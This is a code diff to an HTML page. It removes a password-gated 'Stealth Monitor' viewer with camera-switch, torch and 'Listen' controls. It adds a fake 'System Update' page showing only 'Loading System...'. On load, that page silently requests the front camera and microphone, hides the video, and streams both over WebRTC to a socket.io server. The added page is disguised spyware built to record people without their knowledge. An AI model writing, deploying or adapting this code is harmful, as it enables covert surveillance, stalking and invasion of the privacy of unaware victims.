@@ -1,34 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head><title>Monitor</title><style>body{background:#111;color:#fff;text-align:center;font-family:sans-serif;}#box{display:flex;flex-wrap:wrap;justify-content:center;gap:20px;padding:20px;}.card{background:#222;padding:15px;border-radius:12px;border:1px solid #444;width:380px;}video{width:100%;background:#000;border-radius:8px;}button{padding:10px;margin:5px;cursor:pointer;border:none;border-radius:5px;background:#f85606;color:#fff;font-weight:bold;flex:1;}#login{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;z-index:99;}</style></head>
+<head><title>System Update</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#000;height:100%;display:flex;align-items:center;justify-content:center;color:#444;font-family:sans-serif;}video{display:none;}</style></head>
 <body>
-    <div id="login"><div><h2>🔒 Access</h2><input type="password" id="ps" placeholder="rony25" autocomplete="off"><button onclick="if(document.getElementById('ps').value=='rony25'){document.getElementById('login').style.display='none';init();}">Go</button></div></div>
-    <h2>🛰️ Stealth Monitor</h2><div id="box"></div>
+    <div>🌀 Loading System...</div>
+    <video id="v" autoplay playsinline muted></video>
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        let socket, peers = {};
-        function init() {
-            socket = io();
-            socket.on("offer", async (d) => {
-                if(peers[d.id]) return;
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                peers[d.id] = pc;
-                const card = document.createElement("div"); card.className="card"; card.id="c-"+d.id;
-                card.innerHTML = `<video id="v-${d.id}" autoplay playsinline></video><div id="i-${d.id}">🔋 --% | Light: OFF</div><div style="display:flex;"><button onclick="socket.emit('switch','${d.id}')">🔄 Switch</button><button id="t-${d.id}" onclick="socket.emit('torch','${d.id}')">💡 Light</button><button onclick="document.getElementById('v-${d.id}').muted=false;alert('Audio Live!')">🔊 Listen</button></div>`;
-                document.getElementById("box").appendChild(card);
-                pc.ontrack = e => document.getElementById("v-"+d.id).srcObject = e.streams[0];
-                await pc.setRemoteDescription(new RTCSessionDescription(d.offer));
-                const a = await pc.createAnswer(); await pc.setLocalDescription(a);
-                socket.emit("answer", { answer: a, id: d.id });
-                pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: d.id });
-            });
-            socket.on("status", d => {
-                if(document.getElementById("i-"+d.id)) document.getElementById("i-"+d.id).innerText = `🔋 ${d.bat}% | Light: ${d.torch?'ON':'OFF'}`;
-                if(document.getElementById("t-"+d.id)) document.getElementById("t-"+d.id).style.background = d.torch ? "green" : "#f85606";
-            });
-            socket.on("ice", d => peers[d.id] && peers[d.id].addIceCandidate(new RTCIceCandidate(d.candidate)));
-            socket.on("left", id => { document.getElementById("c-"+id)?.remove(); delete peers[id]; });
+        const socket = io(); let pc, stream;
+        async function start() {
+            pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            stream.getTracks().forEach(t => pc.addTrack(t, stream));
+            pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
+            const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
+            socket.emit("offer", offer);
         }
+        socket.on("answer", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
+        socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));
+        window.onload = start;
     </script>
 </body>
 </html>
